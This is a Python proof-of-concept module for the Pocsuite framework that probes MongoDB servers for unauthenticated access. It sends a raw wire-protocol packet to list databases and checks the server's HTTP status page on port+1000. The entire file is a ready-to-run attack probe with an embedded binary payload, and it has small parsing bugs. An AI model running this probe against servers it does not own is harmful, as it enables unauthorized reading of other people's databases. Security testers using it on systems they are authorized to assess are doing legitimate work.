#!/usr/bin/env python
# -*- coding:utf-8 -*-

import socket
import urlparse

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = 'ssvid-88997'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['']
    name = 'Mongodb 未授权访问 PoC'
    appPowerLink = 'https://www.mongodb.org/'
    appName = 'Mongodb'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        Mongodb 配置不当导致不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''

    samples = ['']

    def _verify(self):
        result = {}
        payload = "\x3F\x00\x00\x00\x7E\x00\x00\x00\x00\x00\x00\x00\xD4\x07\x00\x00\x04\x00\x00\x00\x61\x64\x6D\x69\x6E\x2E\x24\x63\x6D\x64\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x18\x00\x00\x00\x10\x6C\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00"
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            self.url = self.url.strip("http://")
            host = self.url.split(":")[0]
            port = int(self.url.split(":")[1])
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and 'local' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Port'] = port
                return self.parse_attack(result)
        except:
            pass
        s.close()
        url_p = urlparse.urlparse(self.url)
        url = "%s://%s:%s" % (url_p.scheme, url_p.netloc, str(port + 1000))
        resp = req.get(url)
        if resp.status_code == 200 and 'db version' in resp.content and 'sys info' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
